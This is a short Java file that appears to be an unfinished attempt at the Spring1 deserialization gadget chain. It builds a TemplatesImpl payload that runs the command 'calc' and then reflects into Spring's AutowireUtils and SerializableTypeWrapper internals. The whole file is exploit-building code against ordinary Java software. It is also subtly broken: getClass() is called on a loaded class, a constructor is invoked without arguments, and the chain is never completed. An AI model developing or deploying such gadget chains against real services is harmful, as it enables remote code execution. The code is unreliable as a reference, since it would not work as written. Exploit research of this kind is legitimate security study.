package Seri.Spring;

//import org.springframework.beans.factory.support.AutowireUtils;

import Seri.Utils;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import org.springframework.beans.factory.ObjectFactory;
import org.springframework.util.ReflectionUtils;

import java.io.Serializable;
import java.lang.reflect.Constructor;

public class Spring1 {
    public static void main(String[] args) throws Exception {
        TemplatesImpl templates = Utils.createTemplatesImpl("calc");

        Constructor constructor = Class.forName("org.springframework.beans.factory.support.AutowireUtils$ObjectFactoryDelegatingInvocationHandler").getClass().getDeclaredConstructor(ObjectFactory.class);
        constructor.setAccessible(true);
        constructor.newInstance();

//        ReflectionUtils.invokeMethod()
        Class.forName("org.springframework.core.SerializableTypeWrapper");
    }
}
